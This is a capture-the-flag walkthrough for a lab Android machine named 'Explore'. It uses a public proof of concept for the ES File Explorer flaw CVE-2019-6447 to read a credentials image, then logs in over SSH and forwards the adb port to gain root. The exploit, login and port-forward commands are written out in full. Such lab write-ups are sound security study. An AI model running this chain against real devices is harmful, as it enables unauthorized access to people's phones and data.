Machine Name: Explore
Machine IP: 10.10.10.247

#Recon and Enum

We'll start off with nmap as usual.

Open ports:

59777/tcp open     http    Bukkit JSONAPI httpd for Minecraft game server 3.6.0 or older
42135/tcp open     http    ES File Explorer Name Response httpd
5555/tcp  filtered freeciv
41225/tcp open     unknown
2222/tcp  open     ssh     (protocol 2.0)

Port 42135 looks interesting.
Some google Recon on ES File explorer yields a rather interesting result. A CVE actually exists, because earlier versions of this service had a vulnerability; https://medium.com/@knownsec404team/analysis-of-es-file-explorer-security-vulnerability-cve-2019-6447-7f34407ed566

PoC: https://github.com/fs0c131y/ESFileExplorerOpenPortVuln


python poc.py --cmd getDeviceInfo --ip 10.10.10.247

python poc.py --cmd getDeviceInfo --ip 10.10.10.247

-This command lists all the pictures in this phone.

-An interesting one is the creds.jpg, let's see what we have here.
http://10.10.10.247:59777/sdcard/DCIM/creds.jpg

Awesome stuff here, we get a name and what appears to be a passwd.

kristi: Kr1sT!5h@Rp3xPl0r3!

Let's try to use these to ssh on port 2222

ssh kristi@10.10.10.247 -p 2222

Wow! we can now explore the contents of the sdcard.

cd sdcard and cat out the user.txt

According to https://dev.to/exadra37/android-devices-being-shipped-with-tcp-port-5555-enabled-1ig5, Android devices Being Shipped with TCP Port 5555 Enabled.

As we have listening port 5555 we can so we port forward 5555 to our localhost and get an adb shell.

ssh -p 2222 -L 5555:localhost:5555 kristi@10.10.10.247

we can get a shell through adb shell command

On the LHOST:

sudoapt-get install android-tools-adbs

adb devices -l

adb connect localhost:5555

su to get a root shell.

cd data and cat out the root.txt file.